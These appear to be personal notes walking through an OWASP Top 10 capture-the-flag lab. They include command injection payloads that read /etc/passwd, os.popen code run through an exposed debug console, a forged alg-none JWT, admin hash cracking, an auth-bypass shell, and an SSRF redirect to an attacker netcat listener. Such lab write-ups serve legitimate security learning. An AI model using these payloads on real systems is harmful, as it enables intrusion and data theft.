### Broken Access Control(IDOR challenge)
 login to the website using the given credentials
 ![[img8.png]]
 we see that by changing the id in the we can view another persons note
 so we change the id to 2,3,4,5 and then we get a hint that says this
 ![[img9.png]]
 so now we just set id=0
 ![[img10.png]]
 and we get the flag

  **flag - flag{fivefourthree}**
### CRYPTOGRAPHIC FAILURESS
go to the website and click on login in the top right corner
![[img11.png]]
now inspect source code
![[img12.png]]
it says something about /assets (message in green)

so now we go to /assets 
![[img13.png]]
we click on webapp.db as it's a database, it get's downloaded onto our system
now we use sqlite3 file_name in command line and dump the tables and view the hashes
![[img14.png]]
now the first hash is username and second is password in each line so we crack the password hash of admin using [crackstation](https://crackstation.net/)
![[img15.png]]
so we get the password as qwertyuiop
now we login as admin using the password which we cracked

![[img16.png]]
we get the flag

**FLAG - `THM{Yzc2YjdkMjE5N2VjMzNhOTE3NjdiMjdl}`_**

### INJECTION
command injection and sql injection
COMMAND INJECTION
on doing $(ls) we get this
![[img17.png]]

the strange file definitely is drpepper.txt

when we do $(whoami)
![[img19.png]]
it says apache

we do $(cat /etc/passwd)
![[img18.png]]
we see that everything is under the standard user /sbin/nologin

there is no non-root/non-service/non-daemon user

to find out the version of Alpine linux we do 
$(cat /etc/alpine-release)

## INSECURE DESIGN
in the website we get 3 security questions and the easiest to guess is-
what is your favourite colour?
so we guess all colours in VIBGYOR and we are successful at green
![[Pasted image 20231130205325.png]]
![[Pasted image 20231130205340.png]]
now copy the password and go back to login
login as joseph with the password
![[Pasted image 20231130205423.png]]
now in private we see flag.txt
![[Pasted image 20231130205441.png]]
flag.txt has the flag
**FLAG - `THM{Not_3ven_c4tz_c0uld_sav3_U!}`**

## SECURITY MISCONFIGURATION
do /console
![[Pasted image 20231130210342.png]]
and enter the below command
import os; print(os.popen("ls -l").read())

now modify it to read the contents of app.py
```python
import os; print(os.popen("cat app.py").read())
```

![[Pasted image 20231130210504.png]]
we see the secret_flag

**FLAG - THM{Just_a_tiny_misconfiguration}**

### Vulnerable and Outdated Components 
it says bookstore
download the authentication bypass script
then run it with python script_name target_ip
then type y to launch the shell
then do cat /opt/flag.txt

**FLAG - THM{But_1ts_n0t_myf4ult!}**

### Identification and Authentication Failures Practical
instead of logging in as "admin" we register as " admin", by appending a space in the beginning we get access to everything that admin has access to
here's an example
![[Pasted image 20231130215257.png]]
we get the first flag
![[Pasted image 20231130220023.png]]
**FLAG - fe86079416a21a3c99937fea8874b667**

doing the same for arthur
![[Pasted image 20231130220233.png]]
![[Pasted image 20231130220310.png]]
we get the second flag
**FLAG - d9ac0f7db4fda460ac3edeb75d75e16e**

### SOFTWARE AND DATA INTEGRITY FAILURES
#### SOFTWARE INTEGRITY FAILURES
The problem is that if an attacker somehow hacks into the jQuery official repository, they could change the contents of `https://code.jquery.com/jquery-3.6.1.min.js`Â to inject malicious code. As a result, anyone visiting your website would now pull the malicious code and execute it into their browsers unknowingly. This is a software integrity failure as your website makes no checks against the third-party library to see if it has changed. Modern browsers allow you to specify a hash along the library's URL so that the library code is executed only if the hash of the downloaded file matches the expected value. This security mechanism is called Subresource Integrity (SRI)

The correct way to insert the library in your HTML code would be to use SRI and include an integrity hash so that if somehow an attacker is able to modify the library, any client navigating through your website won't execute the modified version.

[https://www.srihash.org/](https://www.srihash.org/) use this site to generate hashes for URLs

#### DATA INTEGRITY FAILURES
- cookies are stored on the user's browser, so they can be easily tampered with and one user can access another user's data
- to prevent this there is an integrity mechanism called JSON Web Tokens(JWT)
- The structure of a JWT has 3 parts -
	- the first part is the header which contains the metadata and and the signing algorithm
	- the second part contains the payload which is basically the data which is stored by the client in the web application
	- the third part is the signature which involves a secret hash which only the server has access to
- If the payload is tampered with there is a mismatch in the signature generated and the signature and hence it is tamper-proof
###### NONE ALGORITHM
hackers could also bypass the signature matching check by setting the algorithm to none and removing the signature part

###### CHALLENGE
- On logging into the application as guest, we get 
`Hello guest. Only the admin user is allowed to get the flag!`

- (The guest account password can simply be obtained by entering no password and username as guest)

- so now we need to login as admin, to do that we need to inspect the page, go to storage and find the JWT stored
`eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6Imd1ZXN0IiwiZXhwIjoxNzAxMzY3MzIxfQ.LSGuKdK5wEYwqJPYXgmrk3Ml09nfcr8g2qLz-EaAFWY`

- we need to modify this JWT token so that it matched the admin JWT
- take the first part of the cookie, the header part and put it in [cyberchef](https://gchq.github.io/CyberChef/)
- convert it from base64, then edit the alg to none and then convert it back to base64
here is the final header - `eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0=`
- now do the same for the second part but change it to admin
here is the final payload - `eyJ1c2VybmFtZSI6ImFkbWluIiwiZXhwIjoxNzAxMzY3MzIxfQ==`
- now join the 2 parts with `.`, leave the signature blank, but don't forget the `.`
final JWT token - `eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0=.eyJ1c2VybmFtZSI6ImFkbWluIiwiZXhwIjoxNzAxMzY3MzIxfQ==.`
- now replace the JWT token stored with the above one and refresh the page to get the flag

**FLAG - `THM{Dont_take_cookies_from_strangers}`**

## SECURITY LOGGING AND MONITORING FAILURES
- every action performed by the user is logged
- info stored in logs include-
	- HTTP status codes
	- Time Stamps
	- Usernames
	- API endpoints/page locations
	- IP addresses

## SERVER SIDE REQUEST FORGERY (SSRF)
- attacker coerces a web application into sending requests on their behalf to arbitrary destinations while having control of the request itself. 
application working
1. Send request
`GET /sms?server=srv3.sms.thm&msg=hello`
2. Build query to
 `https://srv3.sms.thm/api/send?msg=hello`
 3. forward to sms provider using api key
  `GET /api/send?msg=hello
  `x-api-key:some_key`

- the attacker can easily modify the server parameter to direct to their machine
- the application directs the SMS request to the attacker's machine now
There is an exercise in THM on this
we need to change the server to our tuno-ip and reload the page
we need to listen on port 8087
```bash
nc -lvnp 8087
```
we need to then paste the changed url on the browser and we get the flag in the terminal
here is the changed URL
`https://10.10.27.153:8087/download?server=tuno-ip:8087&id=75482342`

here's what we get on the terminal
```bash
$ nc -lvnp 8087
listening on [any] 8087 ...
connect to [10.17.97.222] from (UNKNOWN) [10.10.27.153] 49504
